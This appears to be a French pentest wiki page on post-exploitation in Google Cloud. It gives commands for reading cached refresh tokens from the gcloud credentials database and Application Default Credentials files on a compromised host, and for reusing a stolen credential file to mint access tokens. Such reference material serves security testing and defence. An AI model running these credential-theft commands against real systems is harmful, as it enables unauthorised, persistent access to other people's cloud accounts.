---
title: "Jetons d'accès : piller les identifiants gcloud et ADC en cache"
order: 4
description: "Piller les identifiants gcloud en cache et les Application Default Credentials sur disque, et réutiliser leurs refresh tokens et access tokens."
keywords:
  - gcloud credentials
  - ADC
  - application default credentials
  - access token
  - refresh token
  - credential files
---

# Jetons d'accès

Les hôtes de développement et de CI mettent en cache des identifiants GCP sur disque : le store de credentials SQLite de `gcloud` et le fichier des **Application Default Credentials** (ADC). Les deux contiennent des refresh tokens qui forgent indéfiniment de nouveaux access tokens : les lire depuis un hôte compromis vous remet donc l'accès permanent de l'utilisateur ou du compte de service.

## Où ils résident

```bash
# gcloud user credentials (refresh tokens) and the active config
ls ~/.config/gcloud/
sqlite3 ~/.config/gcloud/credentials.db 'select account_id, value from credentials;'
cat ~/.config/gcloud/legacy_credentials/*/adc.json 2>/dev/null

# Application Default Credentials
cat ~/.config/gcloud/application_default_credentials.json
echo "$GOOGLE_APPLICATION_CREDENTIALS"   # may point at a key or ADC file
```

## Les réutiliser

```bash
# drop a stolen ADC file in place and the SDK and client libraries pick it up
export GOOGLE_APPLICATION_CREDENTIALS=/path/stolen_adc.json
gcloud auth print-access-token
# or mint a token straight from a refresh token against the OAuth endpoint
```

## Notes d'exploitation

- Les refresh tokens ADC d'un **utilisateur** portent l'identité Google complète de cet utilisateur, et non un seul projet : ils peuvent donc être larges.
- Sur Windows, le store se trouve sous `%APPDATA%\gcloud\` ; sur les runners de CI, le fichier ADC ou le chemin `GOOGLE_APPLICATION_CREDENTIALS` est la cible.
- Un refresh token survit jusqu'à sa révocation, ce qui en fait une persistance discrète autant qu'un vol.

## Outils

- **gcloud** (`auth print-access-token`, `auth list`).
- **sqlite3** pour lire `credentials.db`.
- Traitement de jetons de type **ROADtools** pour le refresh OAuth brut.

## Références

- [Google: Application Default Credentials](https://cloud.google.com/docs/authentication/application-default-credentials)
- [HackTricks Cloud: GCP local credentials](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/index.html)
- [Hacking the Cloud: GCP](https://hackingthe.cloud/)
